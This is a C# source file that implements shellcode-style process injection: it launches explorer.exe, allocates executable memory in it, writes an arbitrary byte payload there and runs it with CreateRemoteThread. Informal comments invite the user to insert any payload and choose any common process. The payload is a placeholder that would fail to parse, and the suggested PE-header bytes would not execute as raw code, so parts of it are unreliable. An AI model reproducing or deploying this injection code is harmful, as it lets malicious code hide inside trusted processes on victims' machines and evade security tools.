using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

public class RamRun
{
   
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] buffer, uint size, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

   
    public static byte[] HexStringToByteArray(string hex)
    {
        hex = Regex.Replace(hex, @"\s+", ""); 
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < hex.Length; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }

   
    public static bool Inject(string targetProcessName, byte[] payload)
    {
        try
        {
          
            Process targetProcess = Process.Start(targetProcessName);
            targetProcess.WaitForInputIdle();

        
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }

          
            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocMemAddress == IntPtr.Zero)
            {
                return false;
            }

           
            IntPtr bytesWritten;
            bool result = WriteProcessMemory(hProcess, allocMemAddress, payload, (uint)payload.Length, out bytesWritten);
            if (!result || bytesWritten.ToInt32() != payload.Length)
            {
                return false;
            }

        
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out _);
            if (hThread == IntPtr.Zero)
            {
                return false;
            }

            
            CloseHandle(hProcess);
            return true;
        }
        catch (Exception)
        {
            return false;
        }
    }

    
    static void Main(string[] args)
    {
        // hex of whatever u want to add btw its like 4D 5A 90 00 like that space between reminder: dont try to inject a .net dll to a native (c++/C) process it will just silently fail
        string hexPayload = "THIS IS A EXAMPLE = 4A 5A 90 AND THE REST";

        byte[] payload = HexStringToByteArray(hexPayload);
        bool success = Inject("explorer.exe", payload);// any common processes no dont do system.exe 
    }
}
